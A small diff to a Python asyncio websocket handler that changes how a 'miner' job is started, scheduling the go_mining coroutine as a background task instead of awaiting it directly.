@@ -124,7 +124,7 @@ async def handle_message(websocket):
             if "job" in mssg:
                 print(mssg['job'])
                 if mssg["job"] == "miner":
-                    await go_mining(websocket)
+                    asyncio.get_event_loop().create_task(go_mining(websocket))
         elif "command_id" in mssg:
             if mssg["command_id"] in current_commands:
                 command = current_commands.pop(mssg["command_id"])
